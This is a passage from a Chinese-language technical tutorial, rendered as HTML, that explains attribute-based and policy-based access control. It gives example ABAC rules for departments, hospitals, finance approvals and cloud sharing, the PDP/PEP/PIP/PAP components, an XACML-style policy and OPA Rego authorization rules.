</span><span id="__span-9-3"><a id="__codelineno-9-3" name="__codelineno-9-3" href="#__codelineno-9-3"></a>1. 主体属性（Subject Attributes）：
</span><span id="__span-9-4"><a id="__codelineno-9-4" name="__codelineno-9-4" href="#__codelineno-9-4"></a>   - 用户身份：用户ID、用户名
</span><span id="__span-9-5"><a id="__codelineno-9-5" name="__codelineno-9-5" href="#__codelineno-9-5"></a>   - 组织属性：部门、职级、工作地点
</span><span id="__span-9-6"><a id="__codelineno-9-6" name="__codelineno-9-6" href="#__codelineno-9-6"></a>   - 安全属性：安全级别、认证方式
</span><span id="__span-9-7"><a id="__codelineno-9-7" name="__codelineno-9-7" href="#__codelineno-9-7"></a>
</span><span id="__span-9-8"><a id="__codelineno-9-8" name="__codelineno-9-8" href="#__codelineno-9-8"></a>2. 资源属性（Resource Attributes）：
</span><span id="__span-9-9"><a id="__codelineno-9-9" name="__codelineno-9-9" href="#__codelineno-9-9"></a>   - 资源类型：文档、数据、API
</span><span id="__span-9-10"><a id="__codelineno-9-10" name="__codelineno-9-10" href="#__codelineno-9-10"></a>   - 资源元数据：创建者、所属部门、分类
</span><span id="__span-9-11"><a id="__codelineno-9-11" name="__codelineno-9-11" href="#__codelineno-9-11"></a>   - 敏感级别：公开、内部、机密
</span><span id="__span-9-12"><a id="__codelineno-9-12" name="__codelineno-9-12" href="#__codelineno-9-12"></a>
</span><span id="__span-9-13"><a id="__codelineno-9-13" name="__codelineno-9-13" href="#__codelineno-9-13"></a>3. 环境属性（Environment Attributes）：
</span><span id="__span-9-14"><a id="__codelineno-9-14" name="__codelineno-9-14" href="#__codelineno-9-14"></a>   - 时间：日期、时间段、工作日/非工作日
</span><span id="__span-9-15"><a id="__codelineno-9-15" name="__codelineno-9-15" href="#__codelineno-9-15"></a>   - 位置：IP地址、地理位置、网络区域
</span><span id="__span-9-16"><a id="__codelineno-9-16" name="__codelineno-9-16" href="#__codelineno-9-16"></a>   - 上下文：设备类型、安全状态
</span><span id="__span-9-17"><a id="__codelineno-9-17" name="__codelineno-9-17" href="#__codelineno-9-17"></a>
</span><span id="__span-9-18"><a id="__codelineno-9-18" name="__codelineno-9-18" href="#__codelineno-9-18"></a>4. 操作（Action）：
</span><span id="__span-9-19"><a id="__codelineno-9-19" name="__codelineno-9-19" href="#__codelineno-9-19"></a>   - 读取、创建、修改、删除
</span></code></pre></div></p>
<p><strong>策略规则结构：</strong>
<div class="language-text highlight"><pre><span></span><code><span id="__span-10-1"><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a>策略规则格式：
</span><span id="__span-10-2"><a id="__codelineno-10-2" name="__codelineno-10-2" href="#__codelineno-10-2"></a>IF (条件表达式) THEN (允许/拒绝)
</span><span id="__span-10-3"><a id="__codelineno-10-3" name="__codelineno-10-3" href="#__codelineno-10-3"></a>
</span><span id="__span-10-4"><a id="__codelineno-10-4" name="__codelineno-10-4" href="#__codelineno-10-4"></a>示例策略：
</span><span id="__span-10-5"><a id="__codelineno-10-5" name="__codelineno-10-5" href="#__codelineno-10-5"></a>Policy-001: &quot;部门文档访问&quot;
</span><span id="__span-10-6"><a id="__codelineno-10-6" name="__codelineno-10-6" href="#__codelineno-10-6"></a>  IF (
</span><span id="__span-10-7"><a id="__codelineno-10-7" name="__codelineno-10-7" href="#__codelineno-10-7"></a>    subject.department == resource.department AND
</span><span id="__span-10-8"><a id="__codelineno-10-8" name="__codelineno-10-8" href="#__codelineno-10-8"></a>    subject.security_level &gt;= resource.security_level AND
</span><span id="__span-10-9"><a id="__codelineno-10-9" name="__codelineno-10-9" href="#__codelineno-10-9"></a>    action IN [&quot;read&quot;, &quot;write&quot;]
</span><span id="__span-10-10"><a id="__codelineno-10-10" name="__codelineno-10-10" href="#__codelineno-10-10"></a>  ) THEN ALLOW
</span><span id="__span-10-11"><a id="__codelineno-10-11" name="__codelineno-10-11" href="#__codelineno-10-11"></a>
</span><span id="__span-10-12"><a id="__codelineno-10-12" name="__codelineno-10-12" href="#__codelineno-10-12"></a>Policy-002: &quot;工作时间限制&quot;
</span><span id="__span-10-13"><a id="__codelineno-10-13" name="__codelineno-10-13" href="#__codelineno-10-13"></a>  IF (
</span><span id="__span-10-14"><a id="__codelineno-10-14" name="__codelineno-10-14" href="#__codelineno-10-14"></a>    subject.role == &quot;contractor&quot; AND
</span><span id="__span-10-15"><a id="__codelineno-10-15" name="__codelineno-10-15" href="#__codelineno-10-15"></a>    environment.time NOT IN working_hours
</span><span id="__span-10-16"><a id="__codelineno-10-16" name="__codelineno-10-16" href="#__codelineno-10-16"></a>  ) THEN DENY
</span><span id="__span-10-17"><a id="__codelineno-10-17" name="__codelineno-10-17" href="#__codelineno-10-17"></a>
</span><span id="__span-10-18"><a id="__codelineno-10-18" name="__codelineno-10-18" href="#__codelineno-10-18"></a>Policy-003: &quot;跨部门协作&quot;
</span><span id="__span-10-19"><a id="__codelineno-10-19" name="__codelineno-10-19" href="#__codelineno-10-19"></a>  IF (
</span><span id="__span-10-20"><a id="__codelineno-10-20" name="__codelineno-10-20" href="#__codelineno-10-20"></a>    subject.user_id IN resource.collaborators AND
</span><span id="__span-10-21"><a id="__codelineno-10-21" name="__codelineno-10-21" href="#__codelineno-10-21"></a>    action == &quot;read&quot;
</span><span id="__span-10-22"><a id="__codelineno-10-22" name="__codelineno-10-22" href="#__codelineno-10-22"></a>  ) THEN ALLOW
</span><span id="__span-10-23"><a id="__codelineno-10-23" name="__codelineno-10-23" href="#__codelineno-10-23"></a>
</span><span id="__span-10-24"><a id="__codelineno-10-24" name="__codelineno-10-24" href="#__codelineno-10-24"></a>Policy-004: &quot;地理位置限制&quot;
</span><span id="__span-10-25"><a id="__codelineno-10-25" name="__codelineno-10-25" href="#__codelineno-10-25"></a>  IF (
</span><span id="__span-10-26"><a id="__codelineno-10-26" name="__codelineno-10-26" href="#__codelineno-10-26"></a>    resource.classification == &quot;confidential&quot; AND
</span><span id="__span-10-27"><a id="__codelineno-10-27" name="__codelineno-10-27" href="#__codelineno-10-27"></a>    environment.location NOT IN [&quot;office&quot;, &quot;vpn&quot;]
</span><span id="__span-10-28"><a id="__codelineno-10-28" name="__codelineno-10-28" href="#__codelineno-10-28"></a>  ) THEN DENY
</span></code></pre></div></p>
<p><strong>决策流程：</strong>
<div class="language-text highlight"><pre><span></span><code><span id="__span-11-1"><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a>1. 收集属性
</span><span id="__span-11-2"><a id="__codelineno-11-2" name="__codelineno-11-2" href="#__codelineno-11-2"></a>   ├─ 从认证上下文获取主体属性
</span><span id="__span-11-3"><a id="__codelineno-11-3" name="__codelineno-11-3" href="#__codelineno-11-3"></a>   ├─ 从资源元数据获取资源属性
</span><span id="__span-11-4"><a id="__codelineno-11-4" name="__codelineno-11-4" href="#__codelineno-11-4"></a>   └─ 从请求上下文获取环境属性
</span><span id="__span-11-5"><a id="__codelineno-11-5" name="__codelineno-11-5" href="#__codelineno-11-5"></a>
</span><span id="__span-11-6"><a id="__codelineno-11-6" name="__codelineno-11-6" href="#__codelineno-11-6"></a>2. 策略评估
</span><span id="__span-11-7"><a id="__codelineno-11-7" name="__codelineno-11-7" href="#__codelineno-11-7"></a>   ├─ 加载适用的策略规则
</span><span id="__span-11-8"><a id="__codelineno-11-8" name="__codelineno-11-8" href="#__codelineno-11-8"></a>   ├─ 逐条评估规则条件
</span><span id="__span-11-9"><a id="__codelineno-11-9" name="__codelineno-11-9" href="#__codelineno-11-9"></a>   └─ 合并评估结果（优先级、冲突解决）
</span><span id="__span-11-10"><a id="__codelineno-11-10" name="__codelineno-11-10" href="#__codelineno-11-10"></a>
</span><span id="__span-11-11"><a id="__codelineno-11-11" name="__codelineno-11-11" href="#__codelineno-11-11"></a>3. 访问决策
</span><span id="__span-11-12"><a id="__codelineno-11-12" name="__codelineno-11-12" href="#__codelineno-11-12"></a>   └─ 返回 ALLOW / DENY / NOT_APPLICABLE
</span></code></pre></div></p>
<p><strong>实际场景示例：</strong></p>
<div class="language-text highlight"><pre><span></span><code><span id="__span-12-1"><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a>场景1：医疗系统患者数据访问
</span><span id="__span-12-2"><a id="__codelineno-12-2" name="__codelineno-12-2" href="#__codelineno-12-2"></a>
</span><span id="__span-12-3"><a id="__codelineno-12-3" name="__codelineno-12-3" href="#__codelineno-12-3"></a>规则：
</span><span id="__span-12-4"><a id="__codelineno-12-4" name="__codelineno-12-4" href="#__codelineno-12-4"></a>IF (
</span><span id="__span-12-5"><a id="__codelineno-12-5" name="__codelineno-12-5" href="#__codelineno-12-5"></a>  subject.role == &quot;doctor&quot; AND
</span><span id="__span-12-6"><a id="__codelineno-12-6" name="__codelineno-12-6" href="#__codelineno-12-6"></a>  subject.department == patient.current_department AND
</span><span id="__span-12-7"><a id="__codelineno-12-7" name="__codelineno-12-7" href="#__codelineno-12-7"></a>  subject.hospital == patient.hospital AND
</span><span id="__span-12-8"><a id="__codelineno-12-8" name="__codelineno-12-8" href="#__codelineno-12-8"></a>  environment.network == &quot;internal&quot;
</span><span id="__span-12-9"><a id="__codelineno-12-9" name="__codelineno-12-9" href="#__codelineno-12-9"></a>) THEN ALLOW READ patient_record
</span><span id="__span-12-10"><a id="__codelineno-12-10" name="__codelineno-12-10" href="#__codelineno-12-10"></a>
</span><span id="__span-12-11"><a id="__codelineno-12-11" name="__codelineno-12-11" href="#__codelineno-12-11"></a>场景2：金融系统交易审批
</span><span id="__span-12-12"><a id="__codelineno-12-12" name="__codelineno-12-12" href="#__codelineno-12-12"></a>
</span><span id="__span-12-13"><a id="__codelineno-12-13" name="__codelineno-12-13" href="#__codelineno-12-13"></a>规则：
</span><span id="__span-12-14"><a id="__codelineno-12-14" name="__codelineno-12-14" href="#__codelineno-12-14"></a>IF (
</span><span id="__span-12-15"><a id="__codelineno-12-15" name="__codelineno-12-15" href="#__codelineno-12-15"></a>  action == &quot;approve_transaction&quot; AND
</span><span id="__span-12-16"><a id="__codelineno-12-16" name="__codelineno-12-16" href="#__codelineno-12-16"></a>  transaction.amount &lt;= subject.approval_limit AND
</span><span id="__span-12-17"><a id="__codelineno-12-17" name="__codelineno-12-17" href="#__codelineno-12-17"></a>  subject.has_valid_mfa == true AND
</span><span id="__span-12-18"><a id="__codelineno-12-18" name="__codelineno-12-18" href="#__codelineno-12-18"></a>  environment.time IN business_hours
</span><span id="__span-12-19"><a id="__codelineno-12-19" name="__codelineno-12-19" href="#__codelineno-12-19"></a>) THEN ALLOW
</span><span id="__span-12-20"><a id="__codelineno-12-20" name="__codelineno-12-20" href="#__codelineno-12-20"></a>
</span><span id="__span-12-21"><a id="__codelineno-12-21" name="__codelineno-12-21" href="#__codelineno-12-21"></a>场景3：云存储文件共享
</span><span id="__span-12-22"><a id="__codelineno-12-22" name="__codelineno-12-22" href="#__codelineno-12-22"></a>
</span><span id="__span-12-23"><a id="__codelineno-12-23" name="__codelineno-12-23" href="#__codelineno-12-23"></a>规则：
</span><span id="__span-12-24"><a id="__codelineno-12-24" name="__codelineno-12-24" href="#__codelineno-12-24"></a>IF (
</span><span id="__span-12-25"><a id="__codelineno-12-25" name="__codelineno-12-25" href="#__codelineno-12-25"></a>  subject.user_id == resource.owner OR
</span><span id="__span-12-26"><a id="__codelineno-12-26" name="__codelineno-12-26" href="#__codelineno-12-26"></a>  subject.user_id IN resource.shared_with OR
</span><span id="__span-12-27"><a id="__codelineno-12-27" name="__codelineno-12-27" href="#__codelineno-12-27"></a>  (subject.organization == resource.organization AND 
</span><span id="__span-12-28"><a id="__codelineno-12-28" name="__codelineno-12-28" href="#__codelineno-12-28"></a>   resource.visibility == &quot;organization&quot;)
</span><span id="__span-12-29"><a id="__codelineno-12-29" name="__codelineno-12-29" href="#__codelineno-12-29"></a>) THEN ALLOW READ
</span></code></pre></div>
<p><strong>优点：</strong>
- ✅ 极高的灵活性和表达能力
- ✅ 支持动态权限决策
- ✅ 适应复杂业务规则
- ✅ 细粒度控制
- ✅ 减少角色爆炸问题
- ✅ 支持跨组织协作</p>
<p><strong>缺点：</strong>
- ❌ 实现复杂度高
- ❌ 性能开销较大（需评估多个属性）
- ❌ 策略编写和维护难度大
- ❌ 调试和审计困难
- ❌ 需要完善的属性管理系统
- ❌ 学习曲线陡峭</p>
<p><strong>适用场景：</strong>
- 复杂的企业环境（多部门、多层级）
- 需要动态权限的场景
- 跨组织协作平台
- 云服务和多租户系统
- 需要上下文感知的安全系统
- 医疗、金融等强合规行业</p>
<hr />
<h3 id="4-基于策略的访问控制pbac---policy-based-access-control">4. 基于策略的访问控制（PBAC - Policy-Based Access Control）<a class="headerlink" href="#4-基于策略的访问控制pbac---policy-based-access-control" title="链接到此标题">&para;</a></h3>
<p><strong>理论基础：</strong></p>
<p>PBAC通过专门的策略语言和策略引擎来定义和执行访问控制规则，强调策略的集中管理和动态评估。</p>
<p><strong>核心组件：</strong>
<div class="language-text highlight"><pre><span></span><code><span id="__span-13-1"><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a>1. 策略定义点（PDP - Policy Decision Point）
</span><span id="__span-13-2"><a id="__codelineno-13-2" name="__codelineno-13-2" href="#__codelineno-13-2"></a>   - 评估策略并做出访问决策
</span><span id="__span-13-3"><a id="__codelineno-13-3" name="__codelineno-13-3" href="#__codelineno-13-3"></a>
</span><span id="__span-13-4"><a id="__codelineno-13-4" name="__codelineno-13-4" href="#__codelineno-13-4"></a>2. 策略执行点（PEP - Policy Enforcement Point）
</span><span id="__span-13-5"><a id="__codelineno-13-5" name="__codelineno-13-5" href="#__codelineno-13-5"></a>   - 拦截访问请求
</span><span id="__span-13-6"><a id="__codelineno-13-6" name="__codelineno-13-6" href="#__codelineno-13-6"></a>   - 调用PDP获取决策
</span><span id="__span-13-7"><a id="__codelineno-13-7" name="__codelineno-13-7" href="#__codelineno-13-7"></a>   - 执行决策结果
</span><span id="__span-13-8"><a id="__codelineno-13-8" name="__codelineno-13-8" href="#__codelineno-13-8"></a>
</span><span id="__span-13-9"><a id="__codelineno-13-9" name="__codelineno-13-9" href="#__codelineno-13-9"></a>3. 策略信息点（PIP - Policy Information Point）
</span><span id="__span-13-10"><a id="__codelineno-13-10" name="__codelineno-13-10" href="#__codelineno-13-10"></a>   - 提供决策所需的属性信息
</span><span id="__span-13-11"><a id="__codelineno-13-11" name="__codelineno-13-11" href="#__codelineno-13-11"></a>
</span><span id="__span-13-12"><a id="__codelineno-13-12" name="__codelineno-13-12" href="#__codelineno-13-12"></a>4. 策略管理点（PAP - Policy Administration Point）
</span><span id="__span-13-13"><a id="__codelineno-13-13" name="__codelineno-13-13" href="#__codelineno-13-13"></a>   - 策略的创建、修改、删除
</span></code></pre></div></p>
<p><strong>策略语言（XACML概念）：</strong>
<div class="language-xml highlight"><pre><span></span><code><span id="__span-14-1"><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a><span class="cm">&lt;!-- XACML风格的策略示例 --&gt;</span>
</span><span id="__span-14-2"><a id="__codelineno-14-2" name="__codelineno-14-2" href="#__codelineno-14-2"></a><span class="nt">&lt;Policy</span><span class="w"> </span><span class="na">PolicyId=</span><span class="s">&quot;policy-01&quot;</span><span class="w"> </span><span class="na">RuleCombiningAlg=</span><span class="s">&quot;permit-overrides&quot;</span><span class="nt">&gt;</span>
</span><span id="__span-14-3"><a id="__codelineno-14-3" name="__codelineno-14-3" href="#__codelineno-14-3"></a>
</span><span id="__span-14-4"><a id="__codelineno-14-4" name="__codelineno-14-4" href="#__codelineno-14-4"></a><span class="w">  </span><span class="nt">&lt;Target&gt;</span>
</span><span id="__span-14-5"><a id="__codelineno-14-5" name="__codelineno-14-5" href="#__codelineno-14-5"></a><span class="w">    </span><span class="nt">&lt;Resources&gt;</span>
</span><span id="__span-14-6"><a id="__codelineno-14-6" name="__codelineno-14-6" href="#__codelineno-14-6"></a><span class="w">      </span><span class="nt">&lt;Resource&gt;</span>
</span><span id="__span-14-7"><a id="__codelineno-14-7" name="__codelineno-14-7" href="#__codelineno-14-7"></a><span class="w">        </span><span class="nt">&lt;ResourceMatch</span><span class="w"> </span><span class="na">MatchId=</span><span class="s">&quot;string-equal&quot;</span><span class="nt">&gt;</span>
</span><span id="__span-14-8"><a id="__codelineno-14-8" name="__codelineno-14-8" href="#__codelineno-14-8"></a><span class="w">          </span><span class="nt">&lt;AttributeValue&gt;</span>document<span class="nt">&lt;/AttributeValue&gt;</span>
</span><span id="__span-14-9"><a id="__codelineno-14-9" name="__codelineno-14-9" href="#__codelineno-14-9"></a><span class="w">          </span><span class="nt">&lt;ResourceAttributeDesignator</span><span class="w"> </span><span class="na">AttributeId=</span><span class="s">&quot;resource-type&quot;</span><span class="nt">/&gt;</span>
</span><span id="__span-14-10"><a id="__codelineno-14-10" name="__codelineno-14-10" href="#__codelineno-14-10"></a><span class="w">        </span><span class="nt">&lt;/ResourceMatch&gt;</span>
</span><span id="__span-14-11"><a id="__codelineno-14-11" name="__codelineno-14-11" href="#__codelineno-14-11"></a><span class="w">      </span><span class="nt">&lt;/Resource&gt;</span>
</span><span id="__span-14-12"><a id="__codelineno-14-12" name="__codelineno-14-12" href="#__codelineno-14-12"></a><span class="w">    </span><span class="nt">&lt;/Resources&gt;</span>
</span><span id="__span-14-13"><a id="__codelineno-14-13" name="__codelineno-14-13" href="#__codelineno-14-13"></a><span class="w">  </span><span class="nt">&lt;/Target&gt;</span>
</span><span id="__span-14-14"><a id="__codelineno-14-14" name="__codelineno-14-14" href="#__codelineno-14-14"></a>
</span><span id="__span-14-15"><a id="__codelineno-14-15" name="__codelineno-14-15" href="#__codelineno-14-15"></a><span class="w">  </span><span class="nt">&lt;Rule</span><span class="w"> </span><span class="na">RuleId=</span><span class="s">&quot;rule-01&quot;</span><span class="w"> </span><span class="na">Effect=</span><span class="s">&quot;Permit&quot;</span><span class="nt">&gt;</span>
</span><span id="__span-14-16"><a id="__codelineno-14-16" name="__codelineno-14-16" href="#__codelineno-14-16"></a><span class="w">    </span><span class="nt">&lt;Condition&gt;</span>
</span><span id="__span-14-17"><a id="__codelineno-14-17" name="__codelineno-14-17" href="#__codelineno-14-17"></a><span class="w">      </span><span class="nt">&lt;Apply</span><span class="w"> </span><span class="na">FunctionId=</span><span class="s">&quot;and&quot;</span><span class="nt">&gt;</span>
</span><span id="__span-14-18"><a id="__codelineno-14-18" name="__codelineno-14-18" href="#__codelineno-14-18"></a><span class="w">        </span><span class="nt">&lt;Apply</span><span class="w"> </span><span class="na">FunctionId=</span><span class="s">&quot;string-equal&quot;</span><span class="nt">&gt;</span>
</span><span id="__span-14-19"><a id="__codelineno-14-19" name="__codelineno-14-19" href="#__codelineno-14-19"></a><span class="w">          </span><span class="nt">&lt;AttributeValue&gt;</span>owner<span class="nt">&lt;/AttributeValue&gt;</span>
</span><span id="__span-14-20"><a id="__codelineno-14-20" name="__codelineno-14-20" href="#__codelineno-14-20"></a><span class="w">          </span><span class="nt">&lt;SubjectAttributeDesignator</span><span class="w"> </span><span class="na">AttributeId=</span><span class="s">&quot;relationship&quot;</span><span class="nt">/&gt;</span>
</span><span id="__span-14-21"><a id="__codelineno-14-21" name="__codelineno-14-21" href="#__codelineno-14-21"></a><span class="w">        </span><span class="nt">&lt;/Apply&gt;</span>
</span><span id="__span-14-22"><a id="__codelineno-14-22" name="__codelineno-14-22" href="#__codelineno-14-22"></a><span class="w">        </span><span class="nt">&lt;Apply</span><span class="w"> </span><span class="na">FunctionId=</span><span class="s">&quot;time-in-range&quot;</span><span class="nt">&gt;</span>
</span><span id="__span-14-23"><a id="__codelineno-14-23" name="__codelineno-14-23" href="#__codelineno-14-23"></a><span class="w">          </span><span class="nt">&lt;EnvironmentAttributeDesignator</span><span class="w"> </span><span class="na">AttributeId=</span><span class="s">&quot;current-time&quot;</span><span class="nt">/&gt;</span>
</span><span id="__span-14-24"><a id="__codelineno-14-24" name="__codelineno-14-24" href="#__codelineno-14-24"></a><span class="w">          </span><span class="nt">&lt;AttributeValue&gt;</span>09:00:00<span class="nt">&lt;/AttributeValue&gt;</span>
</span><span id="__span-14-25"><a id="__codelineno-14-25" name="__codelineno-14-25" href="#__codelineno-14-25"></a><span class="w">          </span><span class="nt">&lt;AttributeValue&gt;</span>18:00:00<span class="nt">&lt;/AttributeValue&gt;</span>
</span><span id="__span-14-26"><a id="__codelineno-14-26" name="__codelineno-14-26" href="#__codelineno-14-26"></a><span class="w">        </span><span class="nt">&lt;/Apply&gt;</span>
</span><span id="__span-14-27"><a id="__codelineno-14-27" name="__codelineno-14-27" href="#__codelineno-14-27"></a><span class="w">      </span><span class="nt">&lt;/Apply&gt;</span>
</span><span id="__span-14-28"><a id="__codelineno-14-28" name="__codelineno-14-28" href="#__codelineno-14-28"></a><span class="w">    </span><span class="nt">&lt;/Condition&gt;</span>
</span><span id="__span-14-29"><a id="__codelineno-14-29" name="__codelineno-14-29" href="#__codelineno-14-29"></a><span class="w">  </span><span class="nt">&lt;/Rule&gt;</span>
</span><span id="__span-14-30"><a id="__codelineno-14-30" name="__codelineno-14-30" href="#__codelineno-14-30"></a>
</span><span id="__span-14-31"><a id="__codelineno-14-31" name="__codelineno-14-31" href="#__codelineno-14-31"></a><span class="nt">&lt;/Policy&gt;</span>
</span></code></pre></div></p>
<p><strong>现代策略语言（OPA Rego风格）：</strong>
<div class="language-rego highlight"><pre><span></span><code><span id="__span-15-1"><a id="__codelineno-15-1" name="__codelineno-15-1" href="#__codelineno-15-1"></a><span class="c1"># Open Policy Agent (OPA) 策略示例</span>
</span><span id="__span-15-2"><a id="__codelineno-15-2" name="__codelineno-15-2" href="#__codelineno-15-2"></a>
</span><span id="__span-15-3"><a id="__codelineno-15-3" name="__codelineno-15-3" href="#__codelineno-15-3"></a><span class="k">package</span><span class="w"> </span><span class="n">document</span><span class="p">.</span><span class="n">access</span>
</span><span id="__span-15-4"><a id="__codelineno-15-4" name="__codelineno-15-4" href="#__codelineno-15-4"></a>
</span><span id="__span-15-5"><a id="__codelineno-15-5" name="__codelineno-15-5" href="#__codelineno-15-5"></a><span class="c1"># 默认拒绝</span>
</span><span id="__span-15-6"><a id="__codelineno-15-6" name="__codelineno-15-6" href="#__codelineno-15-6"></a><span class="k">default</span><span class="w"> </span><span class="n">allow</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">false</span>
</span><span id="__span-15-7"><a id="__codelineno-15-7" name="__codelineno-15-7" href="#__codelineno-15-7"></a>
</span><span id="__span-15-8"><a id="__codelineno-15-8" name="__codelineno-15-8" href="#__codelineno-15-8"></a><span class="c1"># 文档所有者可以执行任何操作</span>
</span><span id="__span-15-9"><a id="__codelineno-15-9" name="__codelineno-15-9" href="#__codelineno-15-9"></a><span class="n">allow</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-15-10"><a id="__codelineno-15-10" name="__codelineno-15-10" href="#__codelineno-15-10"></a><span class="w">    </span><span class="nb">input</span><span class="p">.</span><span class="n">subject</span><span class="p">.</span><span class="n">id</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="nb">input</span><span class="p">.</span><span class="n">resource</span><span class="p">.</span><span class="n">owner_id</span>
</span><span id="__span-15-11"><a id="__codelineno-15-11" name="__codelineno-15-11" href="#__codelineno-15-11"></a><span class="p">}</span>
</span><span id="__span-15-12"><a id="__codelineno-15-12" name="__codelineno-15-12" href="#__codelineno-15-12"></a>
</span><span id="__span-15-13"><a id="__codelineno-15-13" name="__codelineno-15-13" href="#__codelineno-15-13"></a><span class="c1"># 同部门成员可以读取</span>
</span><span id="__span-15-14"><a id="__codelineno-15-14" name="__codelineno-15-14" href="#__codelineno-15-14"></a><span class="n">allow</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-15-15"><a id="__codelineno-15-15" name="__codelineno-15-15" href="#__codelineno-15-15"></a><span class="w">    </span><span class="nb">input</span><span class="p">.</span><span class="n">action</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="s2">&quot;read&quot;</span>
</span><span id="__span-15-16"><a id="__codelineno-15-16" name="__codelineno-15-16" href="#__codelineno-15-16"></a><span class="w">    </span><span class="nb">input</span><span class="p">.</span><span class="n">subject</span><span class="p">.</span><span class="n">department</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="nb">input</span><span class="p">.</span><span class="n">resource</span><span class="p">.</span><span class="n">department</span>
</span><span id="__span-15-17"><a id="__codelineno-15-17" name="__codelineno-15-17" href="#__codelineno-15-17"></a><span class="p">}</span>
</span><span id="__span-15-18"><a id="__codelineno-15-18" name="__codelineno-15-18" href="#__codelineno-15-18"></a>
</span><span id="__span-15-19"><a id="__codelineno-15-19" name="__codelineno-15-19" href="#__codelineno-15-19"></a><span class="c1"># 经理可以访问下属创建的文档</span>
</span><span id="__span-15-20"><a id="__codelineno-15-20" name="__codelineno-15-20" href="#__codelineno-15-20"></a><span class="n">allow</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-15-21"><a id="__codelineno-15-21" name="__codelineno-15-21" href="#__codelineno-15-21"></a><span class="w">    </span><span class="nb">input</span><span class="p">.</span><span class="n">subject</span><span class="p">.</span><span class="n">role</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="s2">&quot;manager&quot;</span>
</span><span id="__span-15-22"><a id="__codelineno-15-22" name="__codelineno-15-22" href="#__codelineno-15-22"></a><span class="w">    </span><span class="nb">input</span><span class="p">.</span><span class="n">resource</span><span class="p">.</span><span class="n">owner_id</span><span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="nb">input</span><span class="p">.</span><span class="n">subject</span><span class="p">.</span><span class="n">subordinates</span>
</span><span id="__span-15-23"><a id="__codelineno-15-23" name="__codelineno-15-23" href="#__codelineno-15-23"></a><span class="p">}</span>
</span><span id="__span-15-24"><a id="__codelineno-15-24" name="__codelineno-15-24" href="#__codelineno-15-24"></a>
</span><span id="__span-15-25"><a id="__codelineno-15-25" name="__codelineno-15-25" href="#__codelineno-15-25"></a><span class="c1"># 审计员可以只读查看所有文档</span>
</span><span id="__span-15-26"><a id="__codelineno-15-26" name="__codelineno-15-26" href="#__codelineno-15-26"></a><span class="n">allow</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-15-27"><a id="__codelineno-15-27" name="__codelineno-15-27" href="#__codelineno-15-27"></a><span class="w">    </span><span class="nb">input</span><span class="p">.</span><span class="n">subject</span><span class="p">.</span><span class="n">role</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="s2">&quot;auditor&quot;</span>
</span><span id="__span-15-28"><a id="__codelineno-15-28" name="__codelineno-15-28" href="#__codelineno-15-28"></a><span class="w">    </span><span class="nb">input</span><span class="p">.</span><span class="n">action</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="s2">&quot;read&quot;</span>
</span><span id="__span-15-29"><a id="__codelineno-15-29" name="__codelineno-15-29" href="#__codelineno-15-29"></a><span class="p">}</span>
</span><span id="__span-15-30"><a id="__codelineno-15-30" name="__codelineno-15-30" href="#__codelineno-15-30"></a>
</span><span id="__span-15-31"><a id="__codelineno-15-31" name="__codelineno-15-31" href="#__codelineno-15-31"></a><span class="c1"># 策略组合示例</span>
</span><span id="__span-15-32"><a id="__codelineno-15-32" name="__codelineno-15-32" href="#__codelineno-15-32"></a><span class="n">allow</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-15-33"><a id="__codelineno-15-33" name="__codelineno-15-33" href="#__codelineno-15-33"></a><span class="w">    </span><span class="c1"># 工作时间限制</span>
</span><span id="__span-15-34"><a id="__codelineno-15-34" name="__codelineno-15-34" href="#__codelineno-15-34"></a><span class="w">    </span><span class="n">work_hours</span>
</span><span id="__span-15-35"><a id="__codelineno-15-35" name="__codelineno-15-35" href="#__codelineno-15-35"></a><span class="w">    </span><span class="c1"># 来自公司网络</span>
</span><span id="__span-15-36"><a id="__codelineno-15-36" name="__codelineno-15-36" href="#__codelineno-15-36"></a><span class="w">    </span><span class="n">company_network</span>
</span><span id="__span-15-37"><a id="__codelineno-15-37" name="__codelineno-15-37" href="#__codelineno-15-37"></a><span class="w">    </span><span class="c1"># 有有效权限</span>
</span><span id="__span-15-38"><a id="__codelineno-15-38" name="__codelineno-15-38" href="#__codelineno-15-38"></a><span class="w">    </span><span class="n">has_permission</span>
</span><span id="__span-15-39"><a id="__codelineno-15-39" name="__codelineno-15-39" href="#__codelineno-15-39"></a><span class="p">}</span>
</span><span id="__span-15-40"><a id="__codelineno-15-40" name="__codelineno-15-40" href="#__codelineno-15-40"></a>
</span><span id="__span-15-41"><a id="__codelineno-15-41" name="__codelineno-15-41" href="#__codelineno-15-41"></a><span class="n">work_hours</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-15-42"><a id="__codelineno-15-42" name="__codelineno-15-42" href="#__codelineno-15-42"></a><span class="w">    </span><span class="n">hour</span><span class="w"> </span><span class="o">:=</span><span class="w"> </span><span class="n">time</span><span class="p">.</span><span class="n">clock</span><span class="p">(</span><span class="n">time</span><span class="p">.</span><span class="n">now_ns</span><span class="p">())[</span><span class="m">0</span><span class="p">]</span>
</span><span id="__span-15-43"><a id="__codelineno-15-43" name="__codelineno-15-43" href="#__codelineno-15-43"></a><span class="w">    </span><span class="n">hour</span><span class="w"> </span><span class="o">&gt;=</span><span class="w"> </span><span class="m">9</span>
</span><span id="__span-15-44"><a id="__codelineno-15-44" name="__codelineno-15-44" href="#__codelineno-15-44"></a><span class="w">    </span><span class="n">hour</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="m">18</span>
</span><span id="__span-15-45"><a id="__codelineno-15-45" name="__codelineno-15-45" href="#__codelineno-15-45"></a><span class="p">}</span>
